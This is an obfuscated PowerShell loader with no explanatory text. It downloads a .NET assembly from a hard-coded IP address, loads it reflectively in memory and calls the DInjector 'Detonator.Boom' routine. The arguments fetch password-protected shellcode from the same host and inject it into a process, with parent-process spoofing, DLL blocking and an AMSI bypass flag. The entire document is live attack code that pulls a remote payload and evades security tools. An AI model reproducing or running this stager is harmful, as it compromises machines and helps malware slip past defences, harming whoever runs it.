sV ('YuE51')([type] 'SySTeM.REFLEcTIOn.aSSemblY')
${a} = 'currentthread'
${b} = '147.182.172.189'
${c} = 80
${d} = 'user32.dll'
${e} = '9tVI0'
${f} = 'z64&Rx27Z$B%73up'
${g} = 'C:\Windows\System32\svchost.exe'
${h} = 'notepad'
${i} = 'explorer'
${j} = 'msvcp_win.dll'
${k} = 'True'
${l} = 'True'

${methods} = @('remotethread', 'remotethreaddll', 'remotethreadview', 'remotethreadsuspended')
if (${methods}.Contains.Invoke(${a})) {
    ${h} = (&'Start-Process' -WindowStyle 'Hidden' -PassThru ${h}).'Id'
}

${methods} = @('remotethreadapc', 'remotethreadcontext', 'processhollow')
if (${methods}.Contains.Invoke(${a})) {
    try {
        ${i} = (&'Get-Process' ${i} -ErrorAction 'Stop').'Id'
    }
    catch {
        ${i} = 0
    }
}

${cmd} = 'currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z$B%73up /image:C:\Windows\System32\svchost.exe /pid:8668 /ppid:explorer /dll:msvcp_win.dll /blockDlls:True /am51:True'

${data} = (.'Invoke-WebRequest' -UseBasicParsing 'http://147.182.172.189:80/user32.dll').'Content'
${assem} =  ( ls 'vaRIaBLe:yUE51'  ).'Value'::'Load'.Invoke(${data})

${flags} = [Reflection.BindingFlags] ('NonPublic,Static')

${class} = ${assem}.('GetType').Invoke(('DInjector.Detonator'), ${flags})
${entry} = ${class}.('GetMethod').Invoke(('Boom'), ${flags})

${entry}.'Invoke'(${null}, (, ${cmd}.('Split').Invoke(" ")))